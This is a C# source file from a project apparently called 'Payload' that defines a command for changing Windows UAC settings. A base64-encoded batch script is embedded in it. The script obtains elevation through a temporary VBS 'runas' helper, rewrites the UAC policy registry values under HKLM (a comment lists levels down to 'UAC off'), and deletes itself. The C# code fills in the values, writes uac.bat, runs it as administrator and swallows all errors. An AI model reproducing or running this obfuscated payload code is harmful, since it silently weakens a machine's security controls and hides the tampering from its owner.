using Microsoft.Win32;
using CommonClassLibrary;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static CommonClassLibrary.Config;
/*
1. UAC高
ConsentPromptBehaviorAdmin：2
EnableLUA：1
PromptOnSecureDesktop：1
2. UAC中
ConsentPromptBehaviorAdmin：5
EnableLUA：1
PromptOnSecureDesktop：1
3. UAC低
ConsentPromptBehaviorAdmin：5
EnableLUA：1
PromptOnSecureDesktop：0
4. UAC關閉
ConsentPromptBehaviorAdmin：0
EnableLUA：1
PromptOnSecureDesktop：0
*/
namespace Payload.Core.Command
{
    public class RegistryKeyBatCommand : IUacCommand
    {
        private static readonly string _TagPrefix = "{{###";
        private static readonly string _Tagsupfix = "###}}";
        private static readonly string _UacBase64ToBeConfig = @"Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkdldCBBZG1pbjo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpAZWNobyBvZmYKZWNobyBHZXQgQWRtaW5pc3RyYXRvciBSaWdodHMKY2FjbHMuZXhlICIlU3lzdGVtRHJpdmUlXFN5c3RlbSBWb2x1bWUgSW5mb3JtYXRpb24iID5udWwgMj5udWwKaWYgJWVycm9ybGV2ZWwlPT0wIGdvdG8gQWRtaW4KaWYgZXhpc3QgIiV0ZW1wJVxnZXRhZG1pbi52YnMiIGRlbCAvZiAvcSAiJXRlbXAlXGdldGFkbWluLnZicyIKZWNobyBTZXQgUmVxdWVzdFVBQyA9IENyZWF0ZU9iamVjdF4oIlNoZWxsLkFwcGxpY2F0aW9uIl4pPiIldGVtcCVcZ2V0YWRtaW4udmJzIgplY2hvIFJlcXVlc3RVQUMuU2hlbGxFeGVjdXRlICIlfnMwIiwiIiwiIiwicnVuYXMiLDEgPj4iJXRlbXAlXGdldGFkbWluLnZicyIKZWNobyBXU2NyaXB0LlF1aXQgPj4iJXRlbXAlXGdldGFkbWluLnZicyIKIiV0ZW1wJVxnZXRhZG1pbi52YnMiIC9mCmlmIGV4aXN0ICIldGVtcCVcZ2V0YWRtaW4udmJzIiBkZWwgL2YgL3EgIiV0ZW1wJVxnZXRhZG1pbi52YnMiCmV4aXQKOkFkbWluCmVjaG8gU3VjY2Vzc2Z1bGx5IEdldCBBZG1pbmlzdHJhdG9yIFJpZ2h0cwo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6QWRqdXN0IFJlZ2lzdHJ5LCBEaXNhYmxlIFVBQzo6Ojo6Ojo6Ojo6Ojo6Ojo6OgpyZWcgYWRkICJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiAiQ29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4iIC90IHJlZ19kd29yZCAvZCB7eyMjI0NvbnNlbnRQcm9tcHRCZWhhdmlvckFkbWluIyMjfX0gL0YKcmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3YgIkVuYWJsZUxVQSIgL3QgcmVnX2R3b3JkIC9kIHt7IyMjRW5hYmxlTFVBIyMjfX0gL0YKcmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3YgIlByb21wdE9uU2VjdXJlRGVza3RvcCIgL3QgcmVnX2R3b3JkIC9kIHt7IyMjUHJvbXB0T25TZWN1cmVEZXNrdG9wIyMjfX0gL0YKOjo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OkRlbGV0ZSB0aGlzIGJhdDo6Ojo6Ojo6Ojo6Ojo6Ojo6OgplY2hvIGogfCBkZWwgdWFjLmJhdA==";
        private static readonly string _ConsentPromptBehaviorAdmin_Tag = $@"{_TagPrefix}{UacConifg.ConsentPromptBehaviorAdmin_Name}{_Tagsupfix}";
        private static readonly string _EnableLUA_Tag = $@"{_TagPrefix}{UacConifg.EnableLUA_Name}{_Tagsupfix}";
        private static readonly string _PromptOnSecureDesktop_Tag = $@"{_TagPrefix}{UacConifg.PromptOnSecureDesktop_Name}{_Tagsupfix}";
        private string _TargetBatFullPath = string.Empty;

        public override Task Execute()
        {
            try
            {
                BatCall();

            }
            catch { }
            finally
            {
                //DeleteBatFile();
            }

            return null;
        }

        public void DeleteBatFile()
        {
            try
            {
#if DEBUG
                return;
#else
                File.Delete(_TargetBatFullPath);
#endif
            }
            catch { }
        }

        public string PrepareBatText()
        {
            string uacBatText = TextHelper.Base64Decode(_UacBase64ToBeConfig);

            uacBatText = uacBatText.Replace(_ConsentPromptBehaviorAdmin_Tag, UacConifg.GetUacConfig(UacLevel, UacConifg.ConsentPromptBehaviorAdmin_Name).ToString());
            uacBatText = uacBatText.Replace(_EnableLUA_Tag, UacConifg.GetUacConfig(UacLevel, UacConifg.EnableLUA_Name).ToString());
            uacBatText = uacBatText.Replace(_PromptOnSecureDesktop_Tag, UacConifg.GetUacConfig(UacLevel, UacConifg.PromptOnSecureDesktop_Name).ToString());
#if DEBUG
            uacBatText += "pause";
            Console.WriteLine(uacBatText);
#endif
            return uacBatText;
        }

        void BatCall()
        {
            _TargetBatFullPath = Config.Instance.WorkSpaceDir + "\\uac.bat";

            using (StreamWriter writer = new StreamWriter(_TargetBatFullPath))
            {
                writer.Write(PrepareBatText());
            }
            var p = new Process();
            p.StartInfo.UseShellExecute = true;
            p.StartInfo.Verb = "runas";
            p.StartInfo.FileName = _TargetBatFullPath;
            p.Start();
        }
    }
}
